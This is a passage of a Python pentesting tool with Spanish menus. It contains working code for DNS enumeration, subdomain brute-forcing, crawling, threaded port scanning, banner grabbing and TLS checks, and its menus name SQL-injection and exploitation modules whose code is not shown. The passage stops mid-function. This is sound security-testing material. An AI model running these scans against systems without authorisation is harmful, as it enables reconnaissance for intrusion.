#!/usr/bin/env python3
"""
M-dark29 - Herramienta de Pentesting Web
Autor: Eizer Gonzalez / www.linkedin.com/in/eizerg
Versión: 2.0
Descripción: Herramienta avanzada para pruebas de seguridad en entornos controlados
"""

import os
import sys
import time
import requests
import subprocess
import socket
import json
import re
import threading
import queue
import hashlib
import base64
import urllib.parse
import xml.etree.ElementTree as ET
from urllib.parse import urlparse, quote, urljoin
import concurrent.futures
import dns.resolver
import random
import string
from datetime import datetime
import ssl
from bs4 import BeautifulSoup
import xml.dom.minidom

# Configuración global
requests.packages.urllib3.disable_warnings()
session = requests.Session()

class Colors:
    """Colores para la terminal"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

def banner():
    """Muestra el banner de la herramienta"""
    print(f"""{Colors.RED}{Colors.BOLD}
    ███╗   ███╗      ██████╗  █████╗ ██████╗ ██╗  ██╗█████ █████╗
    ████╗ ████║      ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝   ██ ██ ██║
    ██╔████╔██║█████╗██║  ██║███████║██████╔╝█████╔╝ █████ █████║
    ██║╚██╔╝██║╚════╝██║  ██║██╔══██║██╔══██╗██╔═██╗ ██       ██║
    ██║ ╚═╝ ██║      ██████╔╝██║  ██║██║  ██║██║  ██╗█████╗   ██║
    ╚═╝     ╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚════╝   ╚═╝
    {Colors.END}{Colors.YELLOW}              Herramienta Avanzada de Pentesting{Colors.END}
    """)
    print(f"{Colors.BOLD}{Colors.BLUE}https://www.linkedin.com/in/eizerg{Colors.END}")
    
    print(f"{Colors.RED}{Colors.BOLD}╔══════════════════════════════════════════════════════════════════╗{Colors.END}")
    print(f"{Colors.RED}{Colors.BOLD}║  {Colors.YELLOW}¡ADVERTENCIA! HERRAMIENTA PARA USO ÉTICO EN ENTORNOS CONTROLADOS{Colors.RED}║{Colors.END}")
    print(f"{Colors.RED}{Colors.BOLD}║  {Colors.WHITE}• Solo usar en sistemas con autorización EXPLÍCITA por escrito{Colors.RED}  ║{Colors.END}")
    print(f"{Colors.RED}{Colors.BOLD}║  {Colors.WHITE}• Las pruebas intrusivas pueden causar daños en sistemas{Colors.RED}        ║{Colors.END}")
    print(f"{Colors.RED}{Colors.BOLD}║  {Colors.WHITE}• El desarrollador NO se hace responsable del MAL USO{Colors.RED}           ║{Colors.END}")
    print(f"{Colors.RED}{Colors.BOLD}╚══════════════════════════════════════════════════════════════════╝{Colors.END}\n")

def disclaimer_intrusivo():
    """Muestra disclaimer adicional para funciones intrusivas"""
    print(f"\n{Colors.RED}{Colors.BOLD}╔══════════════════════════════════════════════════════════════════╗{Colors.END}")
    print(f"{Colors.RED}{Colors.BOLD}║  {Colors.YELLOW}¡ADVERTENCIA CRÍTICA! FUNCIONES INTRUSIVAS DETECTADAS{Colors.RED}           ║{Colors.END}")
    print(f"{Colors.RED}{Colors.BOLD}║                                                                  ║{Colors.END}")
    print(f"{Colors.RED}{Colors.BOLD}║  {Colors.WHITE}• Estas pruebas pueden:                                   {Colors.RED}      ║{Colors.END}")
    print(f"{Colors.RED}{Colors.BOLD}║    - Causar Denegación de Servicio (DoS)                       {Colors.RED}  ║{Colors.END}")
    print(f"{Colors.RED}{Colors.BOLD}║    - Corromper datos                                             {Colors.RED}║{Colors.END}")
    print(f"{Colors.RED}{Colors.BOLD}║    - Alterar configuraciones                                     {Colors.RED}║{Colors.END}")
    print(f"{Colors.RED}{Colors.BOLD}║    - Desencadenar alarmas de seguridad                          {Colors.RED} ║{Colors.END}")
    print(f"{Colors.RED}{Colors.BOLD}║                                                                  ║{Colors.END}")
    print(f"{Colors.RED}{Colors.BOLD}║  {Colors.WHITE}• REQUIERE AUTORIZACIÓN ESCRITA ESPECÍFICA para estas pruebas  {Colors.RED} ║{Colors.END}")
    print(f"{Colors.RED}{Colors.BOLD}╚══════════════════════════════════════════════════════════════════╝{Colors.END}")
    
    respuesta = input(f"\n{Colors.YELLOW}[?] ¿Tienes autorización EXPLÍCITA para pruebas intrusivas? (s/n): {Colors.END}").lower()
    if respuesta != 's':
        print(f"{Colors.RED}[!] Acceso denegado a funciones intrusivas{Colors.END}")
        return False
    return True

def mostrar_menu_principal():
    """Muestra el menú principal"""
    print(f"\n{Colors.BLUE}{Colors.BOLD}╔════════════════════ MENÚ PRINCIPAL ════════════════════╗{Colors.END}")
    print(f"{Colors.BLUE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}1.{Colors.END} Reconocimiento y Enumeración               {Colors.BLUE}{Colors.BOLD}         ║{Colors.END}")
    print(f"{Colors.BLUE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}2.{Colors.END} Escaneo Avanzado                         {Colors.BLUE}{Colors.BOLD}           ║{Colors.END}")
    print(f"{Colors.BLUE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}3.{Colors.END} Pruebas de Vulnerabilidad Web             {Colors.BLUE}{Colors.BOLD}          ║{Colors.END}")
    print(f"{Colors.BLUE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}4.{Colors.END} Ataques de Inyección SQL                 {Colors.BLUE}{Colors.BOLD}           ║{Colors.END}")
    print(f"{Colors.BLUE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}5.{Colors.END} Pruebas de Autenticación                 {Colors.BLUE}{Colors.BOLD}           ║{Colors.END}")
    print(f"{Colors.BLUE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}6.{Colors.END} Análisis de Tecnologías                  {Colors.BLUE}{Colors.BOLD}           ║{Colors.END}")
    print(f"{Colors.BLUE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}7.{Colors.END} Ataques Intrusivos (CRÍTICO)             {Colors.BLUE}{Colors.BOLD}           ║{Colors.END}")
    print(f"{Colors.BLUE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}8.{Colors.END} Explotación Avanzada                    {Colors.BLUE}{Colors.BOLD}            ║{Colors.END}")
    print(f"{Colors.BLUE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}9.{Colors.END} Reporte y Documentación                 {Colors.BLUE}{Colors.BOLD}            ║{Colors.END}")
    print(f"{Colors.BLUE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}0.{Colors.END} Salir                                    {Colors.BLUE}{Colors.BOLD}           ║{Colors.END}")
    print(f"{Colors.BLUE}{Colors.BOLD}╚════════════════════════════════════════════════════════╝{Colors.END}")
    
    try:
        opcion = int(input(f"\n{Colors.YELLOW}[?] Selecciona una opción (0-9): {Colors.END}"))
        return opcion
    except ValueError:
        print(f"{Colors.RED}[!] Opción inválida{Colors.END}")
        return -1

# ============================
# MÓDULO 1: RECONOCIMIENTO COMPLETO
# ============================

def menu_reconocimiento(objetivo):
    """Menú de reconocimiento completo"""
    while True:
        print(f"\n{Colors.PURPLE}{Colors.BOLD}╔════════════ RECONOCIMIENTO AVANZADO ═════════════╗{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}1.{Colors.END} Enumeración DNS Completa              {Colors.PURPLE}{Colors.BOLD}        ║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}2.{Colors.END} Búsqueda de Subdominios (Fuerza Bruta) {Colors.PURPLE}{Colors.BOLD}       ║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}3.{Colors.END} WHOIS Lookup Completo                 {Colors.PURPLE}{Colors.BOLD}        ║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}4.{Colors.END} Google Dorks Automatizados            {Colors.PURPLE}{Colors.BOLD}        ║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}5.{Colors.END} OSINT y Fuentes Abiertas              {Colors.PURPLE}{Colors.BOLD}        ║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}6.{Colors.END} Información del Servidor Web          {Colors.PURPLE}{Colors.BOLD}        ║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}7.{Colors.END} Crawling del Sitio Web                {Colors.PURPLE}{Colors.BOLD}        ║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}8.{Colors.END} Extracción de Metadatos               {Colors.PURPLE}{Colors.BOLD}        ║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}0.{Colors.END} Volver al Menú Principal              {Colors.PURPLE}{Colors.BOLD}        ║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}╚══════════════════════════════════════════════════╝{Colors.END}")
        
        try:
            opcion = int(input(f"\n{Colors.YELLOW}[?] Selecciona opción: {Colors.END}"))
            
            if opcion == 0:
                break
            elif opcion == 1:
                enumeracion_dns_completa(objetivo)
            elif opcion == 2:
                fuerza_bruta_subdominios(objetivo)
            elif opcion == 3:
                whois_completo(objetivo)
            elif opcion == 4:
                google_dorks_automatizados(objetivo)
            elif opcion == 5:
                osint_investigacion(objetivo)
            elif opcion == 6:
                info_servidor_completa(objetivo)
            elif opcion == 7:
                crawling_sitio(objetivo)
            elif opcion == 8:
                extraccion_metadatos(objetivo)
            else:
                print(f"{Colors.RED}[!] Opción inválida{Colors.END}")
                
        except ValueError:
            print(f"{Colors.RED}[!] Opción inválida{Colors.END}")

def enumeracion_dns_completa(objetivo):
    """Enumeración DNS completa"""
    print(f"\n{Colors.GREEN}[*] Realizando enumeración DNS completa...{Colors.END}")
    
    dominio = urlparse(objetivo).netloc
    
    tipos_dns = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA', 'CNAME', 'PTR', 'SRV']
    
    try:
        for tipo in tipos_dns:
            try:
                print(f"\n{Colors.CYAN}[+] Buscando registros {tipo}...{Colors.END}")
                respuestas = dns.resolver.resolve(dominio, tipo)
                for respuesta in respuestas:
                    print(f"  {Colors.GREEN}✓{Colors.END} {respuesta}")
            except dns.resolver.NoAnswer:
                print(f"  {Colors.YELLOW}[-] No hay registros {tipo}{Colors.END}")
            except dns.resolver.NXDOMAIN:
                print(f"  {Colors.RED}[!] Dominio no existe{Colors.END}")
                break
            except Exception as e:
                print(f"  {Colors.RED}[!] Error {tipo}: {e}{Colors.END}")
        
        # Reverse DNS lookup para IPs encontradas
        print(f"\n{Colors.CYAN}[+] Realizando Reverse DNS Lookup...{Colors.END}")
        try:
            ips = dns.resolver.resolve(dominio, 'A')
            for ip in ips:
                try:
                    hostname = socket.gethostbyaddr(ip.address)[0]
                    print(f"  {Colors.GREEN}✓{Colors.END} {ip.address} → {hostname}")
                except:
                    print(f"  {Colors.YELLOW}[-] {ip.address} → No tiene reverse{Colors.END}")
        except:
            print(f"  {Colors.RED}[!] Error en reverse lookup{Colors.END}")
            
        print(f"\n{Colors.GREEN}[+] Enumeración DNS completada{Colors.END}")
        
    except Exception as e:
        print(f"{Colors.RED}[!] Error en enumeración DNS: {e}{Colors.END}")

def fuerza_bruta_subdominios(objetivo):
    """Fuerza bruta de subdominios"""
    if not disclaimer_intrusivo():
        return
    
    print(f"\n{Colors.GREEN}[*] Iniciando fuerza bruta de subdominios...{Colors.END}")
    
    dominio = urlparse(objetivo).netloc
    
    # Cargar lista de subdominios comunes
    subdominios = []
    
    # Intentar cargar lista desde archivo
    try:
        with open('/usr/share/wordlists/dns/subdomains-top1million-110000.txt', 'r') as f:
            subdominios = [line.strip() for line in f.readlines()[:1000]]  # Limitar a 1000
    except:
        # Lista básica si no hay archivo
        subdominios = [
            'www', 'mail', 'ftp', 'webmail', 'admin', 'test', 'dev', 'staging',
            'api', 'secure', 'portal', 'blog', 'shop', 'store', 'app', 'mobile',
            'support', 'cpanel', 'whm', 'webdisk', 'webhost', 'ns1', 'ns2',
            'smtp', 'pop', 'imap', 'git', 'svn', 'vpn', 'wiki', 'm', 'static',
            'cdn', 'img', 'images', 'assets', 'media', 'download', 'upload',
            'backup', 'beta', 'alpha', 'demo', 'stage', 'test2', 'test3',
            'server', 'client', 'db', 'database', 'mysql', 'oracle', 'sql',
            'old', 'new', 'temp', 'tmp', 'archive', 'back', 'home', 'office'
        ]
    
    print(f"{Colors.CYAN}[+] Probando {len(subdominios)} subdominios...{Colors.END}")
    
    encontrados = []
    
    def probar_subdominio(sub):
        subdominio = f"{sub}.{dominio}"
        try:
            socket.gethostbyname(subdominio)
            return subdominio
        except:
            return None
    
    # Usar threading para acelerar
    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        resultados = list(executor.map(probar_subdominio, subdominios))
    
    for resultado in resultados:
        if resultado:
            encontrados.append(resultado)
            print(f"  {Colors.GREEN}✓{Colors.END} {resultado}")
    
    if encontrados:
        print(f"\n{Colors.GREEN}[+] {len(encontrados)} subdominios encontrados{Colors.END}")
        
        # Guardar resultados
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        archivo = f"subdominios_{dominio}_{timestamp}.txt"
        with open(archivo, 'w') as f:
            for sub in encontrados:
                f.write(f"{sub}\n")
        print(f"{Colors.CYAN}[+] Resultados guardados en: {archivo}{Colors.END}")
    else:
        print(f"\n{Colors.RED}[-] No se encontraron subdominios{Colors.END}")

def crawling_sitio(objetivo):
    """Crawling básico del sitio web"""
    print(f"\n{Colors.GREEN}[*] Iniciando crawling del sitio web...{Colors.END}")
    
    try:
        visited = set()
        to_visit = [objetivo]
        max_pages = 50
        count = 0
        
        while to_visit and count < max_pages:
            url = to_visit.pop(0)
            
            if url in visited:
                continue
                
            visited.add(url)
            count += 1
            
            try:
                print(f"{Colors.CYAN}[+] Crawling: {url}{Colors.END}")
                response = requests.get(url, verify=False, timeout=10)
                
                if response.status_code == 200:
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    # Extraer enlaces
                    for link in soup.find_all('a', href=True):
                        href = link['href']
                        full_url = urljoin(url, href)
                        
                        # Filtrar solo URLs del mismo dominio
                        if urlparse(full_url).netloc == urlparse(objetivo).netloc:
                            if full_url not in visited and full_url not in to_visit:
                                to_visit.append(full_url)
                    
                    # Extraer formularios
                    forms = soup.find_all('form')
                    if forms:
                        print(f"  {Colors.YELLOW}[+] Formularios encontrados en {url}:{Colors.END}")
                        for i, form in enumerate(forms, 1):
                            print(f"    {i}. Método: {form.get('method', 'GET')}")
                            print(f"       Action: {form.get('action', '')}")
                    
            except Exception as e:
                print(f"  {Colors.RED}[!] Error en {url}: {e}{Colors.END}")
        
        print(f"\n{Colors.GREEN}[+] Crawling completado{Colors.END}")
        print(f"{Colors.CYAN}[+] Páginas visitadas: {len(visited)}{Colors.END}")
        
        # Guardar resultados
        archivo = f"crawling_{urlparse(objetivo).netloc}.txt"
        with open(archivo, 'w') as f:
            f.write(f"Crawling Results for {objetivo}\n")
            f.write(f"Total pages: {len(visited)}\n\n")
            for page in visited:
                f.write(f"{page}\n")
        
        print(f"{Colors.CYAN}[+] Resultados guardados en: {archivo}{Colors.END}")
        
    except Exception as e:
        print(f"{Colors.RED}[!] Error en crawling: {e}{Colors.END}")

# ============================
# MÓDULO 2: ESCANEO AVANZADO
# ============================

def menu_escaneo_avanzado(objetivo):
    """Menú de escaneo avanzado"""
    while True:
        print(f"\n{Colors.PURPLE}{Colors.BOLD}╔══════════════ ESCANEO AVANZADO ══════════════╗{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}1.{Colors.END} Escaneo Completo de Puertos            {Colors.PURPLE}{Colors.BOLD}   ║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}2.{Colors.END} Detección de Servicios Avanzada       {Colors.PURPLE}{Colors.BOLD}    ║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}3.{Colors.END} Banner Grabbing Avanzado              {Colors.PURPLE}{Colors.BOLD}    ║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}4.{Colors.END} Escaneo de Vulnerabilidades          {Colors.PURPLE}{Colors.BOLD}     ║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}5.{Colors.END} Análisis SSL/TLS                     {Colors.PURPLE}{Colors.BOLD}     ║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}6.{Colors.END} Fuzzing de Directorios               {Colors.PURPLE}{Colors.BOLD}     ║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}7.{Colors.END} Escaneo con Nmap Integrado            {Colors.PURPLE}{Colors.BOLD}    ║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}0.{Colors.END} Volver al Menú Principal              {Colors.PURPLE}{Colors.BOLD}    ║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}╚══════════════════════════════════════════════╝{Colors.END}")
        
        try:
            opcion = int(input(f"\n{Colors.YELLOW}[?] Selecciona opción: {Colors.END}"))
            
            if opcion == 0:
                break
            elif opcion == 1:
                escaneo_puertos_completo(objetivo)
            elif opcion == 2:
                deteccion_servicios_avanzada(objetivo)
            elif opcion == 3:
                banner_grabbing_avanzado(objetivo)
            elif opcion == 4:
                escaneo_vulnerabilidades(objetivo)
            elif opcion == 5:
                analisis_ssl_tls(objetivo)
            elif opcion == 6:
                fuzzing_directorios(objetivo)
            elif opcion == 7:
                escaneo_nmap_integrado(objetivo)
            else:
                print(f"{Colors.RED}[!] Opción inválida{Colors.END}")
                
        except ValueError:
            print(f"{Colors.RED}[!] Opción inválida{Colors.END}")

def escaneo_puertos_completo(objetivo):
    """Escaneo completo de puertos"""
    if not disclaimer_intrusivo():
        return
    
    print(f"\n{Colors.GREEN}[*] Iniciando escaneo completo de puertos...{Colors.END}")
    
    dominio = urlparse(objetivo).netloc
    
    # Rangos de puertos a escanear
    puertos_comunes = list(range(1, 1025))  # Puertos bien conocidos
    puertos_extendidos = [1433, 1521, 3306, 5432, 27017, 6379]  # Bases de datos
    puertos_web = [8080, 8443, 8888, 9000, 9090]  # Web alternativos
    puertos_aplicacion = [3000, 5000, 8000, 9001]  # Aplicaciones
    
    todos_puertos = puertos_comunes + puertos_extendidos + puertos_web + puertos_aplicacion
    todos_puertos = list(set(todos_puertos))  # Eliminar duplicados
    
    print(f"{Colors.CYAN}[+] Escaneando {len(todos_puertos)} puertos en {dominio}{Colors.END}")
    
    abiertos = []
    servicios = {}
    
    def escanear_puerto(puerto):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            resultado = sock.connect_ex((dominio, puerto))
            
            if resultado == 0:
                # Intentar obtener banner
                try:
                    sock.settimeout(2)
                    banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
                    if banner:
                        servicios[puerto] = banner[:100]
                    else:
                        servicios[puerto] = "Sin banner"
                except:
                    servicios[puerto] = "No se pudo obtener banner"
                
                abiertos.append(puerto)
                sock.close()
                return f"  {Colors.GREEN}✓{Colors.END} Puerto {puerto}: ABIERTO"
            else:
                sock.close()
                return f"  {Colors.RED}✗{Colors.END} Puerto {puerto}: Cerrado"
        except Exception as e:
            return f"  {Colors.RED}✗{Colors.END} Puerto {puerto}: Error - {str(e)[:30]}"
    
    # Escanear con threads
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        resultados = list(executor.map(escanear_puerto, todos_puertos))
    
    for resultado in resultados:
        print(resultado)
    
    if abiertos:
        print(f"\n{Colors.GREEN}[+] {len(abiertos)} puertos abiertos encontrados:{Colors.END}")
        for puerto in sorted(abiertos):
            servicio = servicios.get(puerto, "Desconocido")
            print(f"  {Colors.CYAN}•{Colors.END} Puerto {puerto}: {servicio}")
        
        # Análisis de riesgos
        print(f"\n{Colors.YELLOW}[!] Análisis de riesgos:{Colors.END}")
        puertos_riesgo = {
            21: "FTP - Posible acceso no autorizado",
            22: "SSH - Posible fuerza bruta",
            23: "Telnet - Credenciales en texto claro",
            25: "SMTP - Posible spam relay",
            80: "HTTP - Posibles vulnerabilidades web",
            443: "HTTPS - Verificar configuración SSL",
            3389: "RDP - Posible acceso remoto",
            3306: "MySQL - Posible inyección SQL",
            5432: "PostgreSQL - Verificar autenticación",
            6379: "Redis - Posible acceso sin autenticación",
            27017: "MongoDB - Verificar autenticación"
        }
        
        for puerto in abiertos:
            if puerto in puertos_riesgo:
                print(f"  {Colors.RED}⚠{Colors.END} {puertos_riesgo[puerto]}")
        
        print(f"\n{Colors.YELLOW}[!] Siguiente paso:{Colors.END}")
        print(f"  {Colors.CYAN}1.{Colors.END} Investigar cada servicio abierto")
        print(f"  {Colors.CYAN}2.{Colors.END} Buscar vulnerabilidades específicas")
        print(f"  {Colors.CYAN}3.{Colors.END} Verificar autenticación en servicios")
    else:
        print(f"\n{Colors.RED}[-] No se encontraron puertos abiertos{Colors.END}")

def analisis_ssl_tls(objetivo):
    """Análisis de configuración SSL/TLS"""
    print(f"\n{Colors.GREEN}[*] Analizando configuración SSL/TLS...{Colors.END}")
    
    try:
        dominio = urlparse(objetivo).netloc
        
        # Verificar certificado SSL
        context = ssl.create_default_context()
        
        with socket.create_connection((dominio, 443), timeout=10) as sock:
            with context.wrap_socket(sock, server_hostname=dominio) as ssock:
                cert = ssock.getpeercert()
                
                print(f"{Colors.CYAN}[+] Información del certificado:{Colors.END}")
                
                # Sujeto
                if 'subject' in cert:
                    print(f"  {Colors.GREEN}✓{Colors.END} Sujeto:")
                    for item in cert['subject']:
                        for key, value in item:
                            print(f"    {key}: {value}")
                
                # Emisor
                if 'issuer' in cert:
                    print(f"  {Colors.GREEN}✓{Colors.END} Emisor:")
                    for item in cert['issuer']:
                        for key, value in item:
                            print(f"    {key}: {value}")
                
                # Validez
                if 'notBefore' in cert and 'notAfter' in cert:
                    print(f"  {Colors.GREEN}✓{Colors.END} Validez:")
                    print(f"    Desde: {cert['notBefore']}")
                    print(f"    Hasta: {cert['notAfter']}")
                    
                    # Verificar si está expirado
                    from datetime import datetime
                    ahora = datetime.utcnow()
                    expira = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                    
                    if ahora > expira:
                        print(f"  {Colors.RED}⚠ CERTIFICADO EXPIRADO{Colors.END}")
                
                # Versiones SSL/TLS soportadas
                print(f"\n{Colors.CYAN}[+] Probando versiones SSL/TLS:{Colors.END}")
                
                versiones = [
                    (ssl.PROTOCOL_TLSv1, "TLSv1.0"),
                    (ssl.PROTOCOL_TLSv1_1, "TLSv1.1"),
                    (ssl.PROTOCOL_TLSv1_2, "TLSv1.2"),
                    (ssl.PROTOCOL_TLS, "TLSv1.3")
                ]
                
                for protocolo, nombre in versiones:
                    try:
                        context = ssl.SSLContext(protocolo)
                        with socket.create_connection((dominio, 443), timeout=5) as sock:
                            with context.wrap_socket(sock, server_hostname=dominio) as ssock:
                                print(f"  {Colors.GREEN}✓{Colors.END} {nombre} soportado")
                    except:
                        print(f"  {Colors.RED}✗{Colors.END} {nombre} no soportado")
                
                # Cifrados soportados
                print(f"\n{Colors.CYAN}[+] Cifrados débiles detectados:{Colors.END}")
                
                cifrados_debiles = [
                    'RC4', 'DES', '3DES', 'MD5', 'SHA1', 'NULL', 'EXPORT', 'ANON'
                ]
                
                cifrados = ssock.cipher()
                if cifrados:
                    print(f"  Cifrado actual: {cifrados[0]}")
                    
                    for debil in cifrados_debiles:
                        if debil in cifrados[0].upper():
                            print(f"  {Colors.RED}⚠{Colors.END} Cifrado débil detectado: {debil}")
                
        print(f"\n{Colors.GREEN}[+] Análisis SSL/TLS completado{Colors.END}")
        
    except Exception as e:
        print(f"{Colors.RED}[!] Error en análisis SSL: {e}{Colors.END}")


# ============================
# FUNCIONES PARA MENÚ DE ESCANEO AVANZADO
# ============================

def deteccion_servicios_avanzada(objetivo):
    """Detección avanzada de servicios"""
    print(f"\n{Colors.GREEN}[*] Detección avanzada de servicios...{Colors.END}")
    
    dominio = urlparse(objetivo).netloc
    
    # Puerto y servicio común mapping
    servicios_comunes = {
        21: ("FTP", "File Transfer Protocol"),
        22: ("SSH", "Secure Shell"),
        23: ("Telnet", "Telnet"),
        25: ("SMTP", "Simple Mail Transfer Protocol"),
        53: ("DNS", "Domain Name System"),
        80: ("HTTP", "Hypertext Transfer Protocol"),
        110: ("POP3", "Post Office Protocol v3"),
        143: ("IMAP", "Internet Message Access Protocol"),
        443: ("HTTPS", "HTTP Secure"),
        445: ("SMB", "Server Message Block"),
        3306: ("MySQL", "MySQL Database"),
        3389: ("RDP", "Remote Desktop Protocol"),
        5432: ("PostgreSQL", "PostgreSQL Database"),
        5900: ("VNC", "Virtual Network Computing"),
        6379: ("Redis", "Redis Database"),
        8080: ("HTTP-Proxy", "HTTP Proxy"),
        8443: ("HTTPS-Alt", "HTTPS Alternative"),
        27017: ("MongoDB", "MongoDB Database"),
    }
    
    print(f"{Colors.CYAN}[+] Escaneando puertos de servicios comunes...{Colors.END}")
    
    abiertos = []
    
    def escanear_servicio(puerto, nombre, desc):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            resultado = sock.connect_ex((dominio, puerto))
            sock.close()
            
            if resultado == 0:
                # Intentar obtener banner
                try:
                    sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock2.settimeout(2)
                    sock2.connect((dominio, puerto))
                    
                    if puerto in [80, 443, 8080, 8443]:
                        sock2.send(b"GET / HTTP/1.0\r\n\r\n")
                    elif puerto == 21:
                        sock2.send(b"\r\n")
                    elif puerto == 22:
                        sock2.send(b"SSH-2.0-Client\r\n")
                    
                    banner = sock2.recv(1024).decode('utf-8', errors='ignore').strip()
                    sock2.close()
                    
                    if banner:
                        return f"  {Colors.GREEN}✓{Colors.END} {nombre} ({puerto}): ABIERTO\n     Banner: {banner[:100]}..."
                    else:
                        return f"  {Colors.GREEN}✓{Colors.END} {nombre} ({puerto}): ABIERTO"
                except:
                    return f"  {Colors.GREEN}✓{Colors.END} {nombre} ({puerto}): ABIERTO (sin banner)"
            else:
                return None
        except Exception as e:
            return None
    
    # Escanear servicios importantes
    resultados = []
    for puerto, (nombre, desc) in servicios_comunes.items():
        resultado = escanear_servicio(puerto, nombre, desc)
        if resultado:
            resultados.append(resultado)
            abiertos.append((puerto, nombre))
    
    # Mostrar resultados
    for resultado in resultados:
        print(resultado)
    
    if abiertos:
        print(f"\n{Colors.GREEN}[+] {len(abiertos)} servicios detectados{Colors.END}")
        
        # Análisis de seguridad
        print(f"\n{Colors.YELLOW}[!] Análisis de seguridad:{Colors.END}")
        
        servicios_riesgo = {
            21: "FTP - Credenciales en texto claro, considerar SFTP/FTPS",
            23: "Telnet - Extremadamente inseguro, usar SSH",
            25: "SMTP - Verificar configuración para evitar spam relay",
            110: "POP3 - Considerar usar IMAP con SSL",
            143: "IMAP - Usar IMAPS en puerto 993",
            445: "SMB - Verificar parches contra EternalBlue",
            3389: "RDP - Fuerza bruta común, considerar VPN",
        }
        
        for puerto, nombre in abiertos:
            if puerto in servicios_riesgo:
                print(f"  {Colors.RED}⚠{Colors.END} {servicios_riesgo[puerto]}")
        
        print(f"\n{Colors.YELLOW}[!] Recomendaciones:{Colors.END}")
        print(f"  {Colors.CYAN}•{Colors.END} Cerrar puertos no esenciales")
        print(f"  {Colors.CYAN}•{Colors.END} Actualizar servicios a últimas versiones")
        print(f"  {Colors.CYAN}•{Colors.END} Implementar autenticación fuerte")
        print(f"  {Colors.CYAN}•{Colors.END} Usar cifrado (SSL/TLS)")
    else:
        print(f"\n{Colors.RED}[-] No se detectaron servicios comunes{Colors.END}")

def banner_grabbing_avanzado(objetivo):
    """Banner grabbing avanzado"""
    print(f"\n{Colors.GREEN}[*] Banner grabbing avanzado...{Colors.END}")
    
    dominio = urlparse(objetivo).netloc
    
    # Técnicas de banner grabbing
    tecnicas = [
        {
            "nombre": "HTTP Headers",
            "puerto": 80,
            "payload": b"GET / HTTP/1.1\r\nHost: " + dominio.encode() + b"\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\n\r\n"
        },
        {
            "nombre": "HTTPS Headers", 
            "puerto": 443,
            "payload": b"GET / HTTP/1.1\r\nHost: " + dominio.encode() + b"\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\n\r\n"
        },
        {
            "nombre": "FTP Banner",
            "puerto": 21,
            "payload": b"\r\n"
        },
        {
            "nombre": "SSH Banner",
            "puerto": 22, 
            "payload": b"SSH-2.0-Client\r\n"
        },
        {
            "nombre": "SMTP Banner",
            "puerto": 25,
            "payload": b"EHLO example.com\r\n"
        },
        {
            "nombre": "MySQL Banner",
            "puerto": 3306,
            "payload": b"\x0a\x00\x00\x01\x85\xa6\x03\x00\x00\x00\x00\x01\x21\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        },
    ]
    
    print(f"{Colors.CYAN}[+] Probando diferentes técnicas de banner grabbing...{Colors.END}")
    
    for tecnica in tecnicas:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            resultado = sock.connect_ex((dominio, tecnica["puerto"]))
            
            if resultado == 0:
                sock.send(tecnica["payload"])
